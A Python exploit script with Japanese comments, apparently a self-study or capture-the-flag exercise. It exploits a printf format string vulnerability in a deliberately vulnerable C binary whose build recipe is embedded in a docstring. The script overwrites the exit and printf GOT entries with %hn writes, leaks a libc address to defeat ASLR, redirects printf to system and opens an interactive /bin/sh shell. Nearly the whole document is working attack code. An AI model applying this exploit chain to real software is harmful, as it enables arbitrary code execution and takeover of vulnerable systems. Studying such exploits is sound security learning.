"""
書式文字列攻撃

userがprintfの書式を自由に設定できる場合、攻撃が可能
printf(buf);
"""
from ptrlib import *


def split_byte(value:int, interval:int) -> list:
    bytes_ = value.to_bytes(8, byteorder='little')
    chunks = [bytes_[i:i+interval] for i in range(0, 8, interval)]
    return chunks


def show_memory_chunk(chunks:list):
    for i, chunk in enumerate(chunks):
        print(f"[0x{int.from_bytes(chunk, 'little'):02x}]", end="")
    print()


def show_payload(s:str):
    for i,j in enumerate(range(0, len(s), 8)):
        print(i + 6, s[j:j+8])


def get_chunk(func_addr: int):
    chunks = split_byte(func_addr, 1)

    chunk1: int = int(chunks[1][0]) * 0x100 + int(chunks[0][0])
    chunk2: int = int(chunks[3][0]) * 0x100 + int(chunks[2][0])
    chunk3: int = int(chunks[5][0]) * 0x100 + int(chunks[4][0])
    chunk4: int = int(chunks[7][0]) * 0x100 + int(chunks[6][0])

    print(
            "chunk1: ", f"[0x{chunk1:04x}]", f"{chunk1}\n"
            "chunk2: ", f"[0x{chunk2:04x}]", f"{chunk2}\n"
            "chunk3: ", f"[0x{chunk3:04x}]", f"{chunk3}\n"
            "chunk4: ", f"[0x{chunk4:04x}]", f"{chunk4}\n"
    )
    return chunk1, chunk2, chunk3, chunk4


def fsb_unit(func_addr:int , got_target_addr: int) -> bytes:
    chunk1,chunk2,chunk3,chunk4 = get_chunk(func_addr)

    chunk1_is_smaller_than_chunk2 = chunk1 < chunk2
    delta = chunk2 - chunk1 if chunk1_is_smaller_than_chunk2 else chunk1 - chunk2
    format_string = f'%{str(chunk1 if chunk1_is_smaller_than_chunk2 else chunk2)}c%10$hn'
    format_string += f'%{str(delta)}c%11$hn'
    format_string += "p" * (8 - len(format_string) % 8) # 詰物 # $8
    format_string_length = len(format_string)
    match format_string_length // 8:
        case 3:
            format_string += "pppppppp" # アドレスを各領域を固定したいので長さが足りない場合は詰物をする
        case 4:
            pass
        case _:
            print("ERROR")
    payload = format_string.encode("ascii")
    if chunk1_is_smaller_than_chunk2:
        payload += p64(got_target_addr)         # $10
        payload += p64(got_target_addr + 2)     # $11
    else:
        payload += p64(got_target_addr + 2)     # $10
        payload += p64(got_target_addr)         # $11
    print("payload size",hex(len(payload)))
    return payload


def main():
    """

    以下をプロンプトに貼り付け実行バイナリをビルドする
```bash
<< EOF cat | gcc -no-pie -z lazy -o chall_vulnfunc -x c -
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    char buf[0x30] = {};

    setbuf (stdout, NULL);

    puts("Input message");
    read (STDIN_FILENO, buf, sizeof(buf));
    printf(buf);
    exit (0);
}
// gcc chall_vulnfunc.c -no-pie -z lazy -o chall_vulnfunc
EOF
uv run fsb.py
```
    """

    elf = ELF("./chall_vulnfunc")
    proc = Process("./chall_vulnfunc")
    libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6") # ldd chall_vulnfunc

    # ==== return to main ====
    addr_main = elf.symbol("main")
    addr_exit = elf.got("exit")
    print("addr_main",hex(addr_main))
    print("addr_exit",hex(addr_exit)) 
    payload = fsb_unit(addr_main, addr_exit)
    show_payload(payload)
    proc.sendafter("Input message", payload)

    # == libc base addr leak ==
    addr_setbuf_got = elf.got("setbuf") # got addrを調べる
    payload = b"%7$sPPPP" 
    payload += p64(addr_setbuf_got) 

    proc.sendafter("Input message", payload)
    proc.recv(1) # putsの出力する改行を飛ばす
    leaked = proc.recv(6)
    leaked_setbuf = int.from_bytes(leaked, byteorder='little') # 実際にリークされたアドレス
    offset_setbuf = libc_elf.symbol("setbuf")
    libc_elf.base = leaked_setbuf - offset_setbuf # leakしたlibcのベースアドレスをセット

    # ==== printf to system ====
    addr_printf = elf.got("printf")
    addr_system = libc_elf.symbol("system") # libc leakの結果を利用している
    chunk1_g,chunk2_g,chunk3_g,chunk4_g = get_chunk(libc_elf.symbol("printf"))

    print("addr_printf", hex(addr_printf))
    print("addr_system", hex(addr_system)) 
    payload = fsb_unit(addr_system, addr_printf)
    show_payload(payload)
    proc.sendafter("Input message", payload)
    payload = b'/bin/sh'
    proc.sendafter("Input message", payload)
    proc.interactive()

if __name__ == "__main__":
    main()
